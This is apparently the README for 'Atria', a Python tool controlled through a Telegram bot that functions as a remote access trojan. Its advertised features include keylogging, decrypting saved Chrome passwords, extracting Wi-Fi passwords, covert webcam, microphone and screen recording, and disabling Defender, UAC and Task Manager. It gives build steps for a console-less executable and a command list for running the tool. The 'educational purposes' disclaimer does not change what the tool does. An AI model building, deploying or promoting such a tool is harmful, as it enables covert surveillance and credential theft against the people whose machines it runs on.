
# Atria - Telegram Bot Automation

Atria is a versatile Python-based tool designed to control a computer via a Telegram bot. It provides functionalities like task management, file manipulation, screen recording, and system monitoring. This bot is intended for educational purposes and should not be used for any malicious activities.

## Features
- **System Control**: Shutdown, restart, or control Task Manager.
- **File Operations**: Upload/download files, list directories, and execute shell commands.
- **Screen & Audio Recording**: Capture screenshots, record screen, webcam, and microphone.
- **User & Network Info**: Retrieve user accounts, system info, and saved Wi-Fi passwords.
- **Chrome Password Retrieval**: Decrypt and retrieve passwords saved in Google Chrome.
- **Security Control**: Disable Windows security features (Task Manager, UAC, Defender, etc.).
- **Keylogging**: Record key presses and monitor active windows.

## Prerequisites

Before using Atria, ensure you have the following installed:
- Python 3.x
- Telegram bot token (created via [BotFather](https://core.telegram.org/bots#botfather))

### Dependencies
Install the required Python libraries by running:

```bash
pip install -r requirements.txt
```

Alternatively, you can run the `Install Atria.bat` script to automatically install dependencies.

## Configuration

1. **Bot Token**: Add your bot token to the `bot_config.txt` file, located in the script directory. The format should be:
    ```text
    bot_token=<YOUR_BOT_TOKEN>
    chat_id=<CHAT_ID>
    ```

2. **Compile Script (Optional)**: If you wish to compile the script to an executable:
    - Run the following command to compile:
    ```bash
    pyinstaller --onefile --noconsole --add-data "bot_config.txt;." Atria.py
    ```
    - Or use the GUI feature by running the script in a non-compiled mode.

## How to Use

Once you have configured your bot, start the script and send commands via the Telegram bot. Below are some available commands:

### System Control
- `/shutdown`: Shutdown the PC.
- `/restart`: Restart the PC.
- `/dtaskmgr`: Disable Task Manager.

### File Operations
- `/screenshot`: Capture and send a screenshot.
- `/upload`: Upload a file from your PC.
- `/download <filename>`: Download a file from your PC.

### Screen and Audio Recording
- `/screenrecord <seconds>`: Record the screen for the specified time.
- `/mic <seconds>`: Record audio from the microphone for the specified time.
- `/webcam <seconds>`: Record video from the webcam for the specified time.

### Security and User Info
- `/passwords`: Retrieve saved Chrome passwords.
- `/wifilist`: List all saved Wi-Fi networks.
- `/wifipass <network_name>`: Show Wi-Fi password for a specific network.

### Miscellaneous
- `/tasklist`: List all running tasks.
- `/taskkill <process>`: Kill a specific process by name or PID.

## Disclaimer

**Important**: This tool is intended for educational purposes only. Ensure you have permission to control the system where Atria is used. Misuse of this tool may violate local laws and regulations.

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
